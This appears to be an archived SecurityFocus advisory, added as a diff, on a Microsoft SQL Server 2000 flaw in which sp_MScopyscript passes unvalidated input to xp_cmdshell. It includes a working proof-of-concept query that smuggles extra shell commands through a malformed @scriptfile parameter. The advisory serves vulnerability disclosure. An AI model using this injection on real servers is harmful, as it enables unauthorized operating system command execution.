@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/5309/info
+
+The Microsoft SQL Server 2000 sp_MScopyscript stored procedure does not sufficiently validate input before passing it to the xp_cmdshell extended stored procedure. An attacker with the ability to execute a query or pass malicious input to a query may be able to execute operating system commands via xp_cmdshell with the privileges of the SQL Server. 
+
+The sp_MScopyscript stored procedure may be executed by the 'public' role by default, so it is possible that a database user with privileges may potentially exploit this issue.
+
+The Microsoft SQL Server must be configured to function as a distributor for this issue to be exploited. Certain other conditions must be satisfied for exploitation to succeed, such as the SQL Server running in the context of a domain user.
+
+By supplying a malformed @scriptfile parameter an attacker can run arbitrary
+commands:
+
+use master
+declare @cmd nvarchar(4000)
+exec sp_MScopyscriptfile N'c:\autoexec.bat" c:\cp.txt&echo hello >
+c:\ccc.bbb & echo "hello',@cmd OUTPUT
+print @cmd
+
+The above query will copy the autoexec.bat file to cp.txt but also echo hello to a file called ccc.bbb.
